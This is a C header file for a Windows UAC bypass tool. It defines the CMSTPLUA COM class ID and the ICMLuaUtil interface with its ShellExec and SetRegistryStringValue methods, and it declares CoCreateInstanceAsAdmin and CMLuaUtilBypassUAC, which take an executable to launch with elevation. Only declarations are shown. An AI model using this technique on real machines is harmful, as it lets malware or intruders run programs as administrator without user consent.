#pragma once
#ifndef _BYPASS_UAC_H_
#define _BYPASS_UAC_H_


#include <Windows.h>
#include <objbase.h>
#include <strsafe.h>


#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"


typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE *QueryInterface)(
			__RPC__in ICMLuaUtil * This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void **ppvObject);

	ULONG(STDMETHODCALLTYPE *AddRef)(
		__RPC__in ICMLuaUtil * This);

	ULONG(STDMETHODCALLTYPE *Release)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method1)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method2)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method3)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method4)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method5)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method6)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *ShellExec)(
		__RPC__in ICMLuaUtil * This,
		_In_     LPCWSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow
		);

	HRESULT(STDMETHODCALLTYPE *SetRegistryStringValue)(
		__RPC__in ICMLuaUtil * This,
		_In_      HKEY hKey,
		_In_opt_  LPCTSTR lpSubKey,
		_In_opt_  LPCTSTR lpValueName,
		_In_      LPCTSTR lpValueString
		);

	HRESULT(STDMETHODCALLTYPE *Method9)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method10)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method11)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method12)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method13)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method14)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method15)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method16)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method17)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method18)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method19)(
		__RPC__in ICMLuaUtil * This);

	HRESULT(STDMETHODCALLTYPE *Method20)(
		__RPC__in ICMLuaUtil * This);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
};


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid);

BOOL CMLuaUtilBypassUAC(const wchar_t* lpwszExecutable);


#endif